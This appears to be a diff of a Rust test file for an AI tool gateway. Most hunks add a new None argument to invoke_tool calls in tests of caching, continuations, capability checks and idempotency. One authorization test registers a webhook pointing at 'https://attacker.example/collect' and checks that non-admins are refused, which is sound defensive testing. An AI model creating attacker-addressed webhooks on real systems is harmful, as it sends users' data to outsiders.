@@ -651,6 +651,7 @@ providers:
             }),
             Some("session-1"),
             &allow_all_ctx_named(Some("alice"), Some("agent-1")),
+            None,
         )
         .await;
 
@@ -767,6 +768,7 @@ providers:
                     channel: &crate::gateway::input_bridge::NoClientChannel,
                 }
             },
+            None,
         )
         .await
         .unwrap();
@@ -812,6 +814,7 @@ async fn gateway_invocation_attaches_context_integrity_metadata_to_risky_tool_ou
             }),
             Some("session-1"),
             &allow_all_ctx_named(Some("alice"), Some("agent-1")),
+            None,
         )
         .await
         .unwrap();
@@ -2126,6 +2129,7 @@ mod attestation_wiring {
             &json!({"server": "remote_docs", "tool": "search", "arguments": {}}),
             Some("session-1"),
             &allow_all_ctx_named(Some("alice"), Some("agent-1")),
+            None,
         )
         .await
         .unwrap()
@@ -2438,7 +2442,7 @@ auth:
         "tool": "register_webhook",
         "arguments": { "url": "https://attacker.example/collect" }
     });
-    let result = meta.invoke_tool(&args, None, &caller).await;
+    let result = meta.invoke_tool(&args, None, &caller, None).await;
     assert!(
         result.is_err(),
         "a non-admin caller must not create an attacker-addressed webhook"
@@ -2457,7 +2461,7 @@ auth:
         retry: &crate::protocol::mrtr::NO_RETRY,
         ..allow_all_ctx()
     };
-    let admin = meta.invoke_tool(&args, None, &admin_caller).await;
+    let admin = meta.invoke_tool(&args, None, &admin_caller, None).await;
     let admin_msg = admin.map_or_else(|e| e.to_string(), |_| String::new());
     assert!(
         !admin_msg.to_lowercase().contains("admin credential"),
@@ -2964,6 +2968,7 @@ async fn an_enforced_transform_preserves_the_continuation_handle() {
             &json!({"server": "remote_docs", "tool": "search", "arguments": {}}),
             Some("session-1"),
             &caller,
+            None,
         )
         .await
         .unwrap();
@@ -3077,6 +3082,7 @@ async fn an_enforced_transform_does_not_invent_a_continuation_handle() {
             &json!({"server": "remote_docs", "tool": "search", "arguments": {}}),
             Some("session-1"),
             &allow_all_ctx_named(Some("alice"), Some("agent-1")),
+            None,
         )
         .await
         .unwrap();
@@ -3155,6 +3161,7 @@ async fn an_enforced_transform_carries_an_unrecognized_result_type() {
             &json!({"server": "remote_docs", "tool": "search", "arguments": {}}),
             Some("session-1"),
             &allow_all_ctx_named(Some("alice"), Some("agent-1")),
+            None,
         )
         .await
         .unwrap();
@@ -3234,6 +3241,7 @@ async fn an_enforced_transform_carries_an_empty_result_type() {
             &json!({"server": "remote_docs", "tool": "search", "arguments": {}}),
             Some("session-1"),
             &allow_all_ctx_named(Some("alice"), Some("agent-1")),
+            None,
         )
         .await
         .unwrap();
@@ -3324,6 +3332,7 @@ async fn an_enforced_transform_refuses_a_malformed_control_field() {
                 &json!({"server": "remote_docs", "tool": "search", "arguments": {}}),
                 Some("session-1"),
                 &allow_all_ctx_named(Some("alice"), Some("agent-1")),
+                None,
             )
             .await
             .unwrap();
@@ -3468,6 +3477,7 @@ async fn a_declared_input_request_passes_the_gateway_gate() {
             &book_flight(),
             Some("session-1"),
             &allow_all_ctx_declaring(declaring(&json!({"elicitation": {}}))),
+            None,
         )
         .await
         .expect("a declared capability must not be refused");
@@ -3533,6 +3543,7 @@ async fn a_continuation_that_is_never_retried_stores_nothing_gateway_side() {
             &book_flight(),
             Some("session-1"),
             &allow_all_ctx_declaring(declaring(&json!({"elicitation": {}}))),
+            None,
         )
         .await
         .expect("a declared capability must not be refused");
@@ -3580,7 +3591,7 @@ async fn a_refused_input_request_leaves_the_idempotency_key_retryable() {
     // attempt left behind.
     for attempt in ["first", "second"] {
         let err = meta
-            .invoke_tool(&book_flight(), Some("session-1"), &ctx)
+            .invoke_tool(&book_flight(), Some("session-1"), &ctx, None)
             .await
             .expect_err("a refusal must not be replaced by a stored result");
         assert_eq!(
@@ -3602,6 +3613,7 @@ async fn an_undeclared_input_request_is_refused_at_the_gateway() {
             &book_flight(),
             Some("session-1"),
             &allow_all_ctx_declaring(crate::protocol::meta::Declared::NONE),
+            None,
         )
         .await
         .expect_err("a client that declared nothing must not be asked");
@@ -3635,6 +3647,7 @@ async fn a_refusals_required_capabilities_survive_the_response_boundary() {
             &book_flight(),
             Some("session-1"),
             &allow_all_ctx_declaring(crate::protocol::meta::Declared::NONE),
+            None,
         )
         .await
         .expect_err("a client that declared nothing must not be asked");
@@ -3674,6 +3687,7 @@ async fn an_unnameable_caller_is_not_offered_an_interim_exchange() {
             &book_flight(),
             Some("session-1"),
             &anonymous_ctx_declaring(declaring(&json!({"elicitation": {}}))),
+            None,
         )
         .await
         .expect_err("a caller that cannot be bound must not be handed a continuation");
@@ -3905,6 +3919,7 @@ async fn an_unreadable_mode_is_refused_without_echoing_what_the_backend_sent() {
             &book_flight(),
             Some("session-1"),
             &allow_all_ctx_declaring(form_only_client()),
+            None,
         )
         .await
         .expect_err(
@@ -3959,6 +3974,7 @@ async fn a_mode_refusal_carries_the_mode_and_not_a_capability_the_client_already
             &book_flight(),
             Some("session-1"),
             &allow_all_ctx_declaring(form_only_client()),
+            None,
         )
         .await
         .expect_err("a url-mode request to a form-only client must not be relayed");
@@ -3998,6 +4014,7 @@ async fn a_mode_refusal_does_not_claim_the_capability_was_undeclared() {
             &book_flight(),
             Some("session-1"),
             &allow_all_ctx_declaring(form_only_client()),
+            None,
         )
         .await
         .expect_err("a url-mode request to a form-only client must not be relayed");
@@ -4446,6 +4463,7 @@ async fn a_cached_entry_is_live_for_the_agent_the_grant_admits() {
             &json!({"server": "personal_caps", "tool": "calendar_read", "arguments": {}}),
             Some("session-1"),
             &grant_ctx("agent-1"),
+            None,
         )
         .await
         .unwrap();
@@ -4465,6 +4483,7 @@ async fn a_denied_agent_is_not_served_the_cached_body() {
             &json!({"server": "personal_caps", "tool": "calendar_read", "arguments": {}}),
             Some("session-1"),
             &grant_ctx("agent-2"),
+            None,
         )
         .await;
 
@@ -4585,6 +4604,7 @@ async fn b10_a_successful_invoke_does_not_change_the_connections_tool_list() {
             &json!({"server": "mock", "tool": "echo", "arguments": {}}),
             MODERN_SESSIONLESS,
             &allow_all_ctx(),
+            None,
         )
         .await;
     assert!(
@@ -4718,6 +4738,7 @@ async fn b07_a_promotion_on_one_modern_connection_does_not_surface_on_another() 
             &json!({"server": "mock", "tool": "echo", "arguments": {}}),
             MODERN_SESSIONLESS,
             &allow_all_ctx(),
+            None,
         )
         .await;
     assert!(
@@ -4753,6 +4774,7 @@ async fn b07_a_promotion_on_one_modern_connection_does_not_surface_on_another() 
             &json!({"server": "mock", "tool": "echo", "arguments": {}}),
             LEGACY,
             &allow_all_ctx(),
+            None,
         )
         .await;
     assert!(
@@ -5585,6 +5607,7 @@ async fn ac_cache_4a_two_backends_do_not_share_one_cache_entry() {
             &json!({"server": server, "tool": "search", "arguments": {}}),
             Some("session-1"),
             &allow_all_ctx(),
+            None,
         )
         .await
         .unwrap()
@@ -5667,6 +5690,7 @@ async fn ac_cache_4c_two_principals_do_not_share_one_cache_entry() {
             &json!({"server": "remote_docs", "tool": "search", "arguments": {}}),
             Some("session-1"),
             &caller,
+            None,
         )
         .await
         .unwrap()
@@ -5726,6 +5750,7 @@ async fn a_reissued_idempotency_key_is_served_from_the_stored_result() {
             &json!({"server": "payments", "tool": "charge", "arguments": {"cents": 500}}),
             Some("session-1"),
             &ctx,
+            None,
         )
         .await
         .expect("the charge must succeed")
